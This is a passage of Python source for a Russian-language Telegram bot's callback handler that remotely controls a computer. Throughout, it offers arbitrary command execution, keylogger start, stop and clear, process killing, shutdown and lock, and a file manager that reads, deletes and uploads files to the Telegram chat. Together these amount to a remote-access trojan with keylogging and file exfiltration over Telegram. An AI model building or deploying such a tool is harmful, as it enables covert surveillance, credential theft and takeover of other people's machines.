    ⏱ Аптайм: {system_info.get('uptime_hours', 0)}ч {system_info.get('uptime_minutes', 0)}мин
    """
                    else:
                        system_info_text = "\n⚠️ Не удалось получить системную информацию"
                else:
                    system_info_text = "\n⚠️ Системная информация доступна только для текущего устройства"
                
                ip_address = device.get('ip_address', 'N/A')
                
                text = f"""
    📊 <b>Информация об устройстве</b>
    
    <b>Имя:</b> {device_name}
    <b>HWID:</b> <code>{target_hwid}</code>
    <b>IP:</b> {ip_address}
    <b>Последняя активность:</b> {last_online}
    <b>Статус Watchdog:</b> {real_status}
    {system_info_text}
    """
                
                bot.send_message(chat_id, text, parse_mode='HTML')
            else:
                bot.send_message(chat_id, "❌ Устройство не найдено.")
        
        # Подтверждение блокировки (показать диалог)
        elif data == 'action_lock_confirm':
            bot.answer_callback_query(call.id, "🔒 Запрос блокировки...")
            
            # Создаем клавиатуру подтверждения
            markup = types.InlineKeyboardMarkup(row_width=2)
            markup.row(
                types.InlineKeyboardButton("✅ Подтвердить", callback_data="lock_confirm"),
                types.InlineKeyboardButton("❌ Отмена", callback_data="lock_cancel")
            )
            
            # Обновляем сообщение с запросом подтверждения
            bot.edit_message_text(
                "🔒 <b>Подтвердите блокировку компьютера</b>\n\n"
                "После подтверждения компьютер будет заблокирован немедленно.",
                chat_id,
                message_id,
                reply_markup=markup,
                parse_mode='HTML'
            )
        
        # Подтверждение выключения (показать диалог)
        elif data == 'action_shutdown_confirm':
            bot.answer_callback_query(call.id, "⏻ Запрос выключения...")
            
            # Создаем клавиатуру подтверждения
            markup = types.InlineKeyboardMarkup(row_width=2)
            markup.row(
                types.InlineKeyboardButton("✅ Подтвердить", callback_data="poweroff_confirm"),
                types.InlineKeyboardButton("❌ Отмена", callback_data="poweroff_cancel")
            )
            
            # Обновляем сообщение с запросом подтверждения
            bot.edit_message_text(
                "⏻ <b>Подтвердите выключение компьютера</b>\n\n"
                "После подтверждения компьютер будет выключен через 10 секунд.",
                chat_id,
                message_id,
                reply_markup=markup,
                parse_mode='HTML'
            )
        
        # Подтверждение завершения процесса
        elif data.startswith('kill_confirm_'):
            process_name = data.replace('kill_confirm_', '')
            bot.answer_callback_query(call.id, f"💀 Завершаю процесс {process_name}...")
            
            try:
                target_hwid = get_target_device_hwid(user_id)
                
                if target_hwid != CURRENT_HWID:
                    bot.answer_callback_query(call.id, "⚠️ Доступно только для текущего устройства.")
                    return
                
                killed = kill_process(process_name)
                
                if killed > 0:
                    bot.send_message(chat_id, f"✅ Завершено {killed} процессов с именем {process_name}.")
                    db.log_action(user_id, "kill_process", f"Killed {killed} processes: {process_name}")
                else:
                    bot.send_message(chat_id, f"❌ Процессы с именем {process_name} не найдены.")
            except Exception as e:
                bot.send_message(chat_id, f"❌ Ошибка завершения процесса: {e}")
        
        # Отмена завершения процесса
        elif data == 'kill_cancel':
            bot.answer_callback_query(call.id, "❌ Завершение процесса отменено.")
            bot.send_message(chat_id, "❌ Завершение процесса отменено.")
        
        # Выполнение команды CMD
        elif data.startswith('cmd_exec_'):
            cmd = data.replace('cmd_exec_', '')
            bot.answer_callback_query(call.id, f"💻 Выполняю команду...")
            
            try:
                target_hwid = get_target_device_hwid(user_id)
                
                if target_hwid != CURRENT_HWID:
                    bot.answer_callback_query(call.id, "⚠️ Доступно только для текущего устройства.")
                    return
                
                result = execute_command(cmd, timeout=15)
                
                # Обрезаем длинный вывод
                if len(result) > 3000:
                    result = result[:3000] + "\n... (вывод обрезан)"
                
                text = f"💻 <b>Результат выполнения команды:</b>\n<code>{escape_html(cmd)}</code>\n\n"
                text += f"<pre>{escape_html(result)}</pre>"
                
                bot.send_message(chat_id, text, parse_mode='HTML')
                db.log_action(user_id, "execute_cmd", f"Command: {cmd[:50]}")
            except Exception as e:
                bot.send_message(chat_id, f"❌ Ошибка выполнения команды: {e}")
        
        # Управление кейлоггером
        elif data == 'keylog_start':
            bot.answer_callback_query(call.id, "▶️ Запускаю кейлоггер...")
            
            try:
                target_hwid = get_target_device_hwid(user_id)
                
                if target_hwid != CURRENT_HWID:
                    bot.answer_callback_query(call.id, "⚠️ Доступно только для текущего устройства.")
                    return
                
                if start_keylogger():
                    bot.send_message(chat_id, "✅ Кейлоггер запущен.")
                    db.log_action(user_id, "keylog_start")
                else:
                    bot.send_message(chat_id, "❌ Ошибка запуска кейлоггера.")
            except Exception as e:
                bot.send_message(chat_id, f"❌ Ошибка: {e}")
        
        elif data == 'keylog_stop':
            bot.answer_callback_query(call.id, "⏹️ Останавливаю кейлоггер...")
            
            try:
                target_hwid = get_target_device_hwid(user_id)
                
                if target_hwid != CURRENT_HWID:
                    bot.answer_callback_query(call.id, "⚠️ Доступно только для текущего устройства.")
                    return
                
                if stop_keylogger():
                    bot.send_message(chat_id, "✅ Кейлоггер остановлен.")
                    db.log_action(user_id, "keylog_stop")
                else:
                    bot.send_message(chat_id, "❌ Ошибка остановки кейлоггера.")
            except Exception as e:
                bot.send_message(chat_id, f"❌ Ошибка: {e}")
        
        # Файловый менеджер: навигация
        elif data.startswith('files_nav_'):
            bot.answer_callback_query(call.id, "📁 Перехожу в директорию...")
            try:
                target_hwid = get_target_device_hwid(user_id)
                
                if target_hwid != CURRENT_HWID:
                    bot.answer_callback_query(call.id, "⚠️ Доступно только для текущего устройства.")
                    return
                
                # Извлекаем путь и страницу из callback data
                callback_data = data.replace('files_nav_', '')
                if '|' in callback_data:
                    path_part, page_part = callback_data.split('|', 1)
                    path = path_part
                    page = int(page_part) if page_part.isdigit() else 0
                else:
                    path = callback_data
                    page = 0
                
                send_file_manager(chat_id, path, page, message_id)
                db.log_action(user_id, f"file_manager_nav_{path}")
                
            except Exception as e:
                logger.error(f"Ошибка навигации в файловом менеджере: {e}")
                bot.send_message(chat_id, f"❌ Ошибка навигации: {e}")
        
        # Файловый менеджер: пагинация
        elif data.startswith('files_page_'):
            bot.answer_callback_query(call.id, "📄 Переключаю страницу...")
            try:
                target_hwid = get_target_device_hwid(user_id)
                
                if target_hwid != CURRENT_HWID:
                    bot.answer_callback_query(call.id, "⚠️ Доступно только для текущего устройства.")
                    return
                
                # Извлекаем путь и страницу
                callback_data = data.replace('files_page_', '')
                if '|' in callback_data:
                    path, page = callback_data.split('|', 1)
                    page = int(page) if page.isdigit() else 0
                else:
                    path = callback_data
                    page = 0
                
                send_file_manager(chat_id, path, page, message_id)
                
            except Exception as e:
                logger.error(f"Ошибка пагинации в файловом менеджере: {e}")
                bot.send_message(chat_id, f"❌ Ошибка пагинации: {e}")
        
        # Файловый менеджер: просмотр файла
        elif data.startswith('files_view_'):
            bot.answer_callback_query(call.id, "📄 Открываю файл...")
            try:
                target_hwid = get_target_device_hwid(user_id)
                
                if target_hwid != CURRENT_HWID:
                    bot.answer_callback_query(call.id, "⚠️ Доступно только для текущего устройства.")
                    return
                
                filepath = data.replace('files_view_', '')
                send_file_view(chat_id, filepath)
                db.log_action(user_id, f"file_manager_view_{os.path.basename(filepath)}")
                
            except Exception as e:
                logger.error(f"Ошибка просмотра файла: {e}")
                bot.send_message(chat_id, f"❌ Ошибка просмотра файла: {e}")
        
        # Файловый менеджер: предпросмотр содержимого
        elif data.startswith('files_preview_'):
            bot.answer_callback_query(call.id, "👁 Читаю содержимое...")
            try:
                target_hwid = get_target_device_hwid(user_id)
                
                if target_hwid != CURRENT_HWID:
                    bot.answer_callback_query(call.id, "⚠️ Доступно только для текущего устройства.")
                    return
                
                filepath = data.replace('files_preview_', '')
                import os
                
                if not os.path.exists(filepath):
                    bot.send_message(chat_id, f"❌ Файл не найден: {filepath}")
                    return
                
                # Читаем файл (ограничиваем 50 строками)
                content = read_file(filepath, max_lines=50)
                filename = os.path.basename(filepath)
                
                # Отправляем содержимое
                message_text = f"📄 Содержимое файла `{filename}` (первые 50 строк):\n\n```\n{content}\n```"
                if len(message_text) > 4000:
                    message_text = message_text[:4000] + "\n... (файл слишком большой, показаны первые 4000 символов)"
                
                bot.send_message(chat_id, message_text, parse_mode='Markdown')
                
                # Добавляем кнопку "Назад"
                parent_dir = os.path.dirname(filepath)
                keyboard = types.InlineKeyboardMarkup()
                keyboard.add(types.InlineKeyboardButton(
                    text="↩️ Назад к файлу",
                    callback_data=f"files_view_{filepath}"
                ))
                bot.send_message(chat_id, "⬇️ Действия с файлом:", reply_markup=keyboard)
                
                db.log_action(user_id, f"file_manager_preview_{filename}")
                
            except Exception as e:
                logger.error(f"Ошибка предпросмотра файла: {e}")
                bot.send_message(chat_id, f"❌ Ошибка чтения файла: {e}")
        
        # Файловый менеджер: скачивание файла
        elif data.startswith('files_download_'):
            bot.answer_callback_query(call.id, "📥 Скачиваю файл...")
            try:
                target_hwid = get_target_device_hwid(user_id)
                
                if target_hwid != CURRENT_HWID:
                    bot.answer_callback_query(call.id, "⚠️ Доступно только для текущего устройства.")
                    return
                
                filepath = data.replace('files_download_', '')
                import os
                
                if not os.path.exists(filepath):
                    bot.send_message(chat_id, f"❌ Файл не найден: {filepath}")
                    return
                
                filename = os.path.basename(filepath)
                size = os.path.getsize(filepath)
                
                # Проверяем размер файла (ограничиваем 50MB для Telegram)
                if size > 50 * 1024 * 1024:
                    bot.send_message(chat_id, f"❌ Файл слишком большой ({format_size(size)}). Максимальный размер для Telegram: 50MB.")
                    return
                
                # Отправляем файл
                with open(filepath, 'rb') as file:
                    bot.send_document(
                        chat_id,
                        file,
                        caption=f"📥 Файл: {filename}\n📊 Размер: {format_size(size)}",
                        visible_file_name=filename
                    )
                
                db.log_action(user_id, f"file_manager_download_{filename}")
                
            except Exception as e:
                logger.error(f"Ошибка скачивания файла: {e}")
                bot.send_message(chat_id, f"❌ Ошибка скачивания файла: {e}")
        
        # Файловый менеджер: подтверждение удаления
        elif data.startswith('files_delete_confirm_'):
            bot.answer_callback_query(call.id, "🗑 Подтвердите удаление...")
            try:
                filepath = data.replace('files_delete_confirm_', '')
                import os
                filename = os.path.basename(filepath)
                
                # Создаем клавиатуру с подтверждением
                keyboard = types.InlineKeyboardMarkup(row_width=2)
                keyboard.add(
                    types.InlineKeyboardButton("✅ Да, удалить", callback_data=f"files_delete_{filepath}"),
                    types.InlineKeyboardButton("❌ Нет, отменить", callback_data=f"files_view_{filepath}")
                )
                
                bot.send_message(
                    chat_id,
                    f"⚠️ Вы уверены, что хотите удалить файл `{filename}`?\n\nЭто действие необратимо!",
                    reply_markup=keyboard,
                    parse_mode='Markdown'
                )
                
            except Exception as e:
                logger.error(f"Ошибка подтверждения удаления: {e}")
                bot.send_message(chat_id, f"❌ Ошибка: {e}")
        
        # Файловый менеджер: удаление файла
        elif data.startswith('files_delete_'):
            bot.answer_callback_query(call.id, "🗑 Удаляю файл...")
            try:
                target_hwid = get_target_device_hwid(user_id)
                
                if target_hwid != CURRENT_HWID:
                    bot.answer_callback_query(call.id, "⚠️ Доступно только для текущего устройства.")
                    return
                
                filepath = data.replace('files_delete_', '')
                import os
                filename = os.path.basename(filepath)
                
                if delete_file(filepath):
                    bot.send_message(chat_id, f"✅ Файл `{filename}` успешно удален.")
                    
                    # Возвращаемся к родительской директории
                    parent_dir = os.path.dirname(filepath)
                    send_file_manager(chat_id, parent_dir, 0, message_id)
                    
                    db.log_action(user_id, f"file_manager_delete_{filename}")
                else:
                    bot.send_message(chat_id, f"❌ Не удалось удалить файл `{filename}`.")
                
            except Exception as e:
                logger.error(f"Ошибка удаления файла: {e}")
                bot.send_message(chat_id, f"❌ Ошибка удаления файла: {e}")
        
        # Файловый менеджер: закрытие
        elif data == 'files_close':
            bot.answer_callback_query(call.id, "❌ Закрываю файловый менеджер...")
            try:
                bot.delete_message(chat_id, message_id)
            except:
                bot.send_message(chat_id, "📁 Файловый менеджер закрыт.")
        
        # Файловый менеджер: информация
        elif data == 'files_info':
            bot.answer_callback_query(call.id, "📊 Информация о файловом менеджере")
            # Просто подтверждаем, без действий
        
        elif data == 'keylog_clear':
            bot.answer_callback_query(call.id, "🧹 Очищаю лог кейлоггера...")
            
            try:
                from bot_services import clear_keylog
                target_hwid = get_target_device_hwid(user_id)
                
                if target_hwid != CURRENT_HWID:
                    bot.answer_callback_query(call.id, "⚠️ Доступно только для текущего устройства.")
                    return
                
                if clear_keylog():
                    bot.send_message(chat_id, "✅ Лог кейлоггера очищен.")
                    db.log_action(user_id, "keylog_clear")
                else:
                    bot.send_message(chat_id, "❌ Ошибка очистки лога.")
            except Exception as e:
                bot.send_message(chat_id, f"❌ Ошибка: {e}")
        
        else:
            bot.answer_callback_query(call.id, "⚠️ Неизвестная команда.")
    
    except Exception as e:
        logger.error(f"Ошибка обработки callback: {e}")
        import traceback
        logger.error(traceback.format_exc())
        bot.answer_callback_query(call.id, "❌ Ошибка обработки команды.")